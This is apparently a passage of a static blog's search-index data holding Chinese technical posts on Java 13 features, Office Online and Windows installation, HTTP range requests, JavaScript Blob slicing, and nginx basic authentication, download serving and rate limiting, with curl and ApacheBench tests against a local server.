Dynamic CDS Archives 351: ZGC: Uncommit Unused Memory ZGC优化 353: Reimplement the Legacy Socket API Socket的底层实现优化 354: Switch Expressions (Preview) switch表达式增加yield关键字用于返回结果，作用类似于return 355: Text Blocks (Preview) 使用 “”” 三个双引号表示文本块 中文 350: 对 Java 10 中引入的 应用程序类数据共享进行了进一步的简化、改进和扩展 351: ZGC优化 353: Socket的底层实现优化 354: switch表达式增加yield关键字用于返回结果，作用类似于return 355: 使用 “”” 三个双引号表示文本块","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"部署Office-Online","slug":"Web后端/部署Office-Online","date":"2019-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.219Z","comments":true,"path":"Web后端/部署Office-Online/","link":"","permalink":"http://yoursite.com/Web后端/部署Office-Online/","excerpt":"","text":"【详细博文】 【官方教程】 【实现在线编辑示例】 部署的相当多坑的，如果顺利，按照上面的资料走，基本不会有问题。下面记录一些坑位。 我是在VMWare虚拟机上做的测试，需要两台Windows服务器。 坑位 系统版本，windows server 2012，安装域控制和office online一直有未知错误。 安装好系统之后，不要激活，不要安装更新补丁，建议马上拍一个快照。 安装所选择的资源 系统选择 win server 2016 数据中心版 系统安装完，克隆两台链接虚拟机，分别做 AD域控制 和 office-online office-online 要加入到AD域中 op/view.aspx 预览的src中的文档路径必须是域名 wopi 协议编辑中，src支持IP office-online常用命令 新建一个服务 1New-OfficeWebAppsFarm -InternalUrl &quot;http://win-ofs.test.com&quot; -ExternalUrl &quot;http://192.168.1.108&quot; -AllowHttp -EditingEnabled -OpenFromUrlEnabled 修改设置 1Set-OfficeWebAppsFarm -OpenFromUrlEnabled:$true 常用地址12http://192.168.1.108/hosting/discoveryhttp://192.168.1.108/op/generate.aspx# 资源123ed2k://|file|cn_windows_server_2016_updated_feb_2018_x64_dvd_11636703.iso|6294265856|4077CEBEBB40AFA5A66017D2EC7A9CD5|/ed2k://|file|cn_office_online_server_last_updated_november_2017_x64_dvd_100181918.iso|770267136|0660AFCFE1AC9A62E749194874643E98|/","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"记一次U盘安装原版Windows7系统","slug":"随笔/记一次U盘安装原版Windows7系统","date":"2019-08-27T03:32:36.000Z","updated":"2021-12-28T03:24:10.311Z","comments":true,"path":"随笔/记一次U盘安装原版Windows7系统/","link":"","permalink":"http://yoursite.com/随笔/记一次U盘安装原版Windows7系统/","excerpt":"","text":"背景2014年买的老笔记本想要重装系统，老硬件不想装Win10，用U盘装了个微PE安装了原版sp1，装完之后，硬盘原本挺好的四个分区盘符全乱了，一般的盘符可以修改过来，但系统盘变成了D盘，改不过来。 于是想再次重装，顺便对硬盘重新分一下区，分两个区就足够。 Ghost由于Ghost比较方便，首选用它来重装，首先想到的是以前有用过的 老毛桃PE，用U盘烧了个PE，ghost文件也放在U盘，不过不太好使了，里面的分区工具也是不好使，分完区不能用。所以也无法在PE下安装系统。 由于这次分区不能用，只能又回到原版安装了。 原版一、 工具 U盘 一台被重装系统的笔记本 一台完好的笔记本，协助 cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso NT6 HDD Installer（系统引导软件） 二、准备工作 PE是运行在内存中，所以我拔掉了U盘，不影响PE的运行。 格式化掉U盘中的PE。 将 cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso 解压到U盘根目录。 将磁盘引导启动软件HHD也拷贝到U盘 三、开始安装 U盘重新插到重装的笔记本，PE能读到U盘。 运行HHD，按照提示安装引导程序。 确认笔记本的BIOS设置启动项是U盘优先。 重启，启动引导-选择进入HHD。 Windows7的安装界面，这里往下，基本和CD/DVD安装差不多了。 利用Windows7的分区工具重新分区（两个区），格式化。 系统安装目标为C盘。 进入”Windows安装程序”，执行一些“复制文件”和“准备要安装的文件”等操作。 完成之后重启，拔出U盘。 进入Windows安装和设置，基本OK了。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"Win10降级Win7知识","slug":"随笔/Win10降级Win7知识","date":"2019-08-23T03:32:36.000Z","updated":"2021-12-28T03:24:10.306Z","comments":true,"path":"随笔/Win10降级Win7知识/","link":"","permalink":"http://yoursite.com/随笔/Win10降级Win7知识/","excerpt":"","text":"Win8、Win10对技术更新了不少，现在的购买的机器都是预装Win10，如果想要降级为Win7，那么如果想简单的重装系统，会发现装不了。 原因 新的机器都是采用 UEFI BIOS 启动方式 ，它具有启动速度快、安全性高和支持大容量硬盘的特点。 Win10的硬盘分区采用 GUID 格式 修改如果要降级重装 Win7，修改这两个东西： 设置 BIOS 为 Legacy 启动方式，这种是老机器用的方式。 将硬盘分区转换为MBR格式（利用PE分区工具） BIOS具体操作 进入 BIOS 中的 Boot 项 Secure Boot 关闭掉（disable） Boot List Option 选择 Legacy 硬盘分区操作 利用PE的分区工具 找到 转换分区表类型为MBR格式 的功能 这样应该就能装Win7了。 没试验过，仅供参考！ 没试验过，仅供参考！ 没试验过，仅供参考！","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"记一次笔记本键盘失灵故障修复","slug":"随笔/记一次笔记本键盘失灵故障修复","date":"2019-08-22T03:32:36.000Z","updated":"2021-12-28T03:24:10.311Z","comments":true,"path":"随笔/记一次笔记本键盘失灵故障修复/","link":"","permalink":"http://yoursite.com/随笔/记一次笔记本键盘失灵故障修复/","excerpt":"","text":"故障一台 Thinkpad E431 （装的Win7系统）半年没开过机，拿出来时，开机停留在“Windows启动管理器”，不会自动进入系统，并且 Enter 键失效了，无法进入系统。 后来通过乱按左边的键才能进一次系统，在系统里发现 Backspace 和 Shift 键也失效了(可以下载 键盘检测 软件来检查)。 初步怀疑是放置时间太久导致COMS没电，主板的一些配置信息丢失了。F1 进去看了一遍BIOS，没找到什么改的，而且 Enter 失效，通过外接键盘才能改BIOS信息。 意外解决问题有了外接键盘，尝试了 最后一次正确配置 和 安全模式 都不行。 失望之际，拔掉外接键盘还给朋友， 安全模式 下在NotePad++内乱按了一下键盘，结果突然 Enter 和 Backspace 就能用了（一脸懵逼）。 修改 Fn 和 Ctrl 的位置在BIOS中，可以通过设置来切换这两个键的功能。 使用了 ThinkPad 笔记本都知道，键盘左下角的 Ctrl键被 Fn 替代了，然后 Ctrl 移到了 左下2 的位置，这一设计，非常反人类，让人很不习惯，如图： 而一般电脑是键盘是这样的： 如何在键盘 Ctrl 和 Fn 本身位置不变的情况下，互换这两个按键的实际功能，也就是按下Fn实际相当于按下 Ctrl ?","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"深入解析HTTP--断点续传","slug":"前端/深入解析HTTP--断点续传","date":"2019-08-15T12:52:36.000Z","updated":"2021-12-28T03:24:10.262Z","comments":true,"path":"前端/深入解析HTTP--断点续传/","link":"","permalink":"http://yoursite.com/前端/深入解析HTTP--断点续传/","excerpt":"","text":"断点下载HTTP协议中有支持，一般的Web服务器都会支持，如 nginx。 HTTP 协议范围请求允许服务器只发送 HTTP 消息的一部分到客户端。范围请求在传送大的媒体文件，或者与文件下载的断点续传功能搭配使用时非常有用。 应用场景 断点下载，下载大文件可以暂停。 多任务/多线程下载大文件（类似迅雷软件） 一、检查服务器是否支持断点续传12345678910111213root@bogon:~# curl -I http://192.168.0.30/test.txtHTTP/1.1 200 OKServer: nginxDate: Fri, 16 Aug 2019 02:00:07 GMTContent-Type: text/plainContent-Length: 6000Last-Modified: Tue, 13 Aug 2019 09:45:45 GMTConnection: keep-aliveETag: \"5d5286c9-1770\"Access-Control-Allow-Origin: *Access-Control-Allow-Headers: *Access-Control-Allow-Credentials: trueAccept-Ranges: bytes 响应中 Accept-Ranges: bytes 字段表示支持断点续传，并且单位是 bytes。 响应中 Content-Length: 6000 是文件的完整大小。 如果服务器响应未发送 Accept-Ranges ，那么它们有可能不支持断点续传。一些服务器会明确将其值设置为 “none”，以此来表明不支持。在这种情况下，某些应用的下载管理器会将暂停按钮禁用。 二、请求特定的范围假如服务器支持 Range 请求的话，你可以在 Header 中 使用 Range 指示服务器应该返回文件的某部分。 单一范围只需在 Headers 中加入 Range 字段，如 1Range: &quot;bytes=0-99&quot; 表示请求文件的前100个字节，服务器端会返回状态码为 HTTP/1.1 206 Partial Content 的响应 curl请求如下： 123456789101112131415root@bogon:~# curl http://192.168.0.30/test.txt -i -H \"Range: bytes=0-99\"HTTP/1.1 206 Partial ContentServer: nginxDate: Fri, 16 Aug 2019 02:10:05 GMTContent-Type: text/plainContent-Length: 100Last-Modified: Tue, 13 Aug 2019 09:45:45 GMTConnection: keep-aliveETag: \"5d5286c9-1770\"Access-Control-Allow-Origin: *Access-Control-Allow-Headers: *Access-Control-Allow-Credentials: trueContent-Range: bytes 0-99/60001ababadalgharaghtakamminarronnkonnbronntonnerronntbababadalgharaghtakamminarronnkonnbronntonnerronnt 多重范围Range头部也支持一次请求文档的多个部分。请求范围用一个逗号分隔开。 12345678910111213141516171819202122232425root@bogon:~# curl http://192.168.0.30/test.txt -i -H \"Range: bytes=0-50, 100-150\"HTTP/1.1 206 Partial ContentServer: nginxDate: Fri, 16 Aug 2019 02:12:14 GMTContent-Type: multipart/byteranges; boundary=00000000029Content-Length: 278Last-Modified: Tue, 13 Aug 2019 09:45:45 GMTConnection: keep-aliveETag: \"5d5286c9-1770\"Access-Control-Allow-Origin: *Access-Control-Allow-Headers: *Access-Control-Allow-Credentials: true--00000000029Content-Type: text/plainContent-Range: bytes 0-50/60001ababadalgharaghtakamminarronnkonnbronntonnerronntb--00000000029Content-Type: text/plainContent-Range: bytes 100-150/60002ababadalgharaghtakamminarronnkonnbronntonnerronntb--00000000029-- Content-Type：multipart/byteranges 表示这个响应有多个 byterange 。每一部分 byterange 都有他自己的 Content-Type 头部和 Content-Range ，并且使用 boundary 参数对body进行划分。 条件式范围请求当（中断之后）重新开始请求更多资源片段的时候，必须确保自从上一个片段被接收之后该资源没有进行过修改。 The If-Range 请求首部可以用来生成条件式范围请求：假如条件满足的话，条件请求就会生效，服务器会返回状态码为 206 Partial 的响应，以及相应的消息主体。假如条件未能得到满足，那么就会返回状态码为 200 OK 的响应，同时返回整个资源。 该Header字段值中既可以用 Last-Modified 时间值用作验证，也可以用 ETag 标记作为验证，但不能将两者同时使用。 123456789101112131415root@bogon:~# curl http://192.168.0.30/test.txt -i -H \"Range: bytes=100-120\" -H \"If-Range: Tue, 13 Aug 2019 09:45:45 GMT\"HTTP/1.1 206 Partial ContentServer: nginxDate: Fri, 16 Aug 2019 02:27:22 GMTContent-Type: text/plainContent-Length: 21Last-Modified: Tue, 13 Aug 2019 09:45:45 GMTConnection: keep-aliveETag: \"5d5286c9-1770\"Access-Control-Allow-Origin: *Access-Control-Allow-Headers: *Access-Control-Allow-Credentials: trueContent-Range: bytes 100-120/60002ababadalgharaghtakam","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"深入解析HTTP--切片上传","slug":"前端/深入解析HTTP--切片上传","date":"2019-08-15T11:52:36.000Z","updated":"2021-12-28T03:24:10.261Z","comments":true,"path":"前端/深入解析HTTP--切片上传/","link":"","permalink":"http://yoursite.com/前端/深入解析HTTP--切片上传/","excerpt":"","text":"切片上传一般用在大文件上传，防止上传过程中网络断开重头开始，但在HTTP协议里面并没有，所以实现要使用自定义一下方法。 网上很多资料，大概实现的原理： 客户端将大文件切为X份，每份切片都做md5校验。 按顺序一次上传一片，同时前后端做md5校验。 切片上传过程中可以暂停，并且在发生网络异常时，只是某切片上传失败。 上传所有切片之后，请求合并文件，后端将所有切片合并，前后端再次对大文件进行md5校验。 js本地文件切片1let blob = file.slice(start, end,file.type); blob 可以直接放入到 FormData 中。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"js操作Blob合并","slug":"前端/js操作Blob合并","date":"2019-08-13T11:22:36.000Z","updated":"2021-12-28T03:24:10.254Z","comments":true,"path":"前端/js操作Blob合并/","link":"","permalink":"http://yoursite.com/前端/js操作Blob合并/","excerpt":"","text":"概述用 axios 请求二进制文件，一般会得到 Blob 或者 ArrayBuffer。 需要将 axios 的请求设置为 responseType: &#39;blob&#39;或者&#39;arraybuffer&#39;请求二进制文件，一般会得到Blob或者arraybuffer。&#39; 引用 Blob 对象是一个代表二进制数据的基本对象，生成Blob对象有两种方法：一种是使用Blob构造函数，另一种是对现有的Blob对象使用slice方法切出一部分。 ArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区。ArrayBuffer 不能直接操作，而是要通过类型数组对象或 DataView 对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区的内容。 切片和合并123456789//假设blob变量是一张png图片的二进制//切片为三个bloblet blob1 = blob.slice(0, n);let blob2 = blob.slice(n,m);let blob3 = blob.slice(m,length);//合并let merge = new Blob([blob1,blob2,blob3],&#123;type:\"image/png\"&#125;); 参考 《JavaScript 标准参考教程》 《JavaScript 标准参考教程》备份地址，整体阅读效果更好 Web API 接口参考 Blob","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[{"name":"blob,js,vue","slug":"blob-js-vue","permalink":"http://yoursite.com/tags/blob-js-vue/"}]},{"title":"nginx开启用户授权","slug":"Web后端/Nginx开启用户授权","date":"2019-08-02T12:52:36.000Z","updated":"2021-12-28T03:24:10.209Z","comments":true,"path":"Web后端/Nginx开启用户授权/","link":"","permalink":"http://yoursite.com/Web后端/Nginx开启用户授权/","excerpt":"","text":"有时候有些静态网站：如文档类的，放在公网，希望要用户认证才能访问，Nginx的ngx_http_auth_basic_module 模块基于 “HTTP Basic Authentication” 协议实现了用户认证，可以很方便的实现用户认证。 123456789101112131415server &#123; listen 80; server_name localhost; # 随便填些信息都行 # auth_basic off 关闭用户授权 auth_basic \"welcome\"; # 授权信息路径 auth_basic_user_file /etc/auth_basic/userpasswd; location / &#123; root /var/www/test; index index.html; &#125;&#125; userpasswd 这个文件的一行代表一个用户，格式是： user:passwd ，其中密码是加密的，可以通过 htpasswd 工具来生成。 1234$ htpasswd -cb ./userpasswd test 123456Adding password for user test$ cat userpasswd test:$apr1$2fZNNVc7$/w76Ek8aezH7g1WoLgtx5/ 浏览器授权访问 postman授权访问 postman访问密码错误","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"nginx,ab","slug":"nginx-ab","permalink":"http://yoursite.com/tags/nginx-ab/"}]},{"title":"nginx部署文件下载站点","slug":"Web后端/Nginx部署文件下载站点","date":"2019-08-02T11:52:36.000Z","updated":"2021-12-28T03:24:10.210Z","comments":true,"path":"Web后端/Nginx部署文件下载站点/","link":"","permalink":"http://yoursite.com/Web后端/Nginx部署文件下载站点/","excerpt":"","text":"Nginx可以提供一个简单的Web页面站点为你提供文件下载服务。123456789101112131415161718192021server &#123; listen 6060; server_name localhost; location / &#123; root /var/www/download; # 开启文件服务 autoindex on; autoindex_exact_size off; autoindex_localtime on; #autoindex_format的值默认是html 另外还可以设置为： xml | json | jsonp ，windows下中文文件名会乱码 autoindex_format json; # 下载x流量之后开启限速 limit_rate_after 100k; # 每个连接的下载速度限制 limit_rate 50k; # 展示中文文件名 charset utf-8,gbk; &#125; &#125; 效果：","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"nginx,文件服务","slug":"nginx-文件服务","permalink":"http://yoursite.com/tags/nginx-文件服务/"}]},{"title":"nginx限制下载速率","slug":"Web后端/Nginx限制下载速率","date":"2019-08-01T11:52:36.000Z","updated":"2021-12-28T03:24:10.211Z","comments":true,"path":"Web后端/Nginx限制下载速率/","link":"","permalink":"http://yoursite.com/Web后端/Nginx限制下载速率/","excerpt":"","text":"有些文件放在nginx下，如果不做速率限制，当客户端的网络环境比较好的话，下载速度非常快。这本来是好事，但假如服务器带宽只有10M，而有一个客户下载速率达到10M的话，其他的客户将无法访问服务器。所以，要对单独一个连接进行速率限制。 配置为方便局域网内测试，这里将限制值设置的比较小。1234567891011121314151617server &#123; listen 80; server_name localhost; location / &#123; root /var/www/test; autoindex on; autoindex_exact_size off; autoindex_localtime on; # Sets the initial amount after which the further # transmission of a response to a client will be rate limited # limit_rate_after 10m; limit_rate_after 100k; # 每个连接的下载速度限制 limit_rate 50k; &#125; &#125; limit_rate_after 是一个门阀，表示客户下载 10m 或者 100k 的byte之后开始触发速率限制。limit_rate 是速率限制，最高 50k 。 测试1. wget用wget下载单个文件下载的限制效果 12345678root@bogon:~/download# wget http://192.168.0.30:6060/test.zip--2019-08-01 11:12:20-- http://192.168.0.30:6060/test.zipConnecting to 192.168.0.30:6060... connected.HTTP request sent, awaiting response... 200 OKLength: 3520836 (3.4M) [application/zip]Saving to: ‘test.zip.2’test.zip.2 100%[=====================&gt;] 3.36M 50.3KB/s in 67s 2019-08-01 11:13:26 (51.7 KB/s) - ‘test.zip.2’ saved [3520836/3520836] 2. apache ab-n 10 表示总请求数为10，共发出了10次请求-c 10 表示并发用户数为10，同时有10个用户访问 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354root@bogon:~/download# ab -n 10 -c 10 http://192.168.0.30:6060/test.zipThis is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking 192.168.0.30 (be patient).....doneServer Software: nginxServer Hostname: 192.168.0.30Server Port: 6060Document Path: /test.zipDocument Length: 3520836 bytesConcurrency Level: 10# 测试总共耗时Time taken for tests: 66.629 secondsComplete requests: 10Failed requests: 0Total transferred: 35210750 bytesHTML transferred: 35208360 bytes# 每秒钟的请求量Requests per second: 0.15 [#/sec] (mean)# 平均请求等待时间Time per request: 66628.646 [ms] (mean)# 服务器平均请求响应时间Time per request: 6662.865 [ms] (mean, across all concurrent requests)# 带宽速率(这里是 50k * 10连接)Transfer rate: 516.08 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 14 20 4.0 20 28Processing: 66528 66565 21.2 66563 66592Waiting: 0 20 10.5 15 31Total: 66548 66584 22.9 66590 66611Percentage of the requests served within a certain time (ms) 50% 66590 66% 66606 75% 66607 80% 66608 90% 66611 95% 66611 98% 66611 99% 66611 100% 66611 (longest request)root@bogon:~/download# 注意这里的只是限制了单个连接，像迅雷这种采用了多连接下载的软件，这种方法限制不了，还需要限制单个IP的连接数量等。 继续继续继续 3. 限制连接数1234567891011121314151617181920http &#123; ... limit_conn_zone $binary_remote_addr zone=conn_one:10m; #每个IP地址连接数限制 limit_req_zone $binary_remote_addr zone=req_two:10m rate=1r/s; #每个IP一秒钟只处理1个请求 server &#123; listen 6060; server_name localhost:6060; location / &#123; root /var/www; limit_conn conn_one 1;#指定一个IP只能同时存在1个连接 limit_req zone=req_two burst=2 nodelay; # 最多2个队列等待，其他请求会被丢弃 limit_rate 10k; # 每个连接的下载速度限制10k &#125; &#125;&#125; 测试并发 12345678910111213141516171819202122232425262728293031323334353637383940414243444546$ ab -n 100 -c 10 http://192.168.0.30:6060/test.txtThis is ApacheBench, Version 2.3 &lt;$Revision: 1843412 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking 192.168.0.30 (be patient).....doneServer Software: nginxServer Hostname: 192.168.0.30Server Port: 6060Document Path: /test.txtDocument Length: 627 bytesConcurrency Level: 10Time taken for tests: 0.027 secondsComplete requests: 100# 97个请求失败Failed requests: 97 (Connect: 0, Receive: 0, Length: 97, Exceptions: 0)Non-2xx responses: 97Total transferred: 36997 bytesHTML transferred: 20311 bytesRequests per second: 3700.00 [#/sec] (mean)Time per request: 2.703 [ms] (mean)Time per request: 0.270 [ms] (mean, across all concurrent requests)Transfer rate: 1336.81 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 1 0.9 1 6Processing: 1 2 1.2 1 6Waiting: 0 1 0.8 1 4Total: 1 2 1.5 2 8Percentage of the requests served within a certain time (ms) 50% 2 66% 2 75% 2 80% 3 90% 5 95% 6 98% 8 99% 8 100% 8 (longest request) 查看nginx的日志，一共97条错误日志，说明 zone “req_two”生效了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596972020/05/22 16:48:10 [error] 11868#8704: *548 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *549 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *550 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *551 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *552 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *553 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *554 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *555 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *557 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *558 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *559 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *560 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *561 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *562 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *563 limiting requests, excess: 2.995 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *564 limiting requests, excess: 2.995 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *566 limiting requests, excess: 2.995 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *565 limiting requests, excess: 2.995 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *567 limiting requests, excess: 2.995 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *568 limiting requests, excess: 2.994 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *569 limiting requests, excess: 2.994 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *570 limiting requests, excess: 2.994 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *571 limiting requests, excess: 2.993 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *572 limiting requests, excess: 2.993 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *573 limiting requests, excess: 2.990 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *574 limiting requests, excess: 2.990 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *575 limiting requests, excess: 2.987 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *576 limiting requests, excess: 2.987 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *577 limiting requests, excess: 2.987 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *578 limiting requests, excess: 2.987 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *579 limiting requests, excess: 2.987 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *581 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *582 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *580 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *583 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *584 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *585 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 11868#8704: *586 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;2020/05/22 16:48:10 [error] 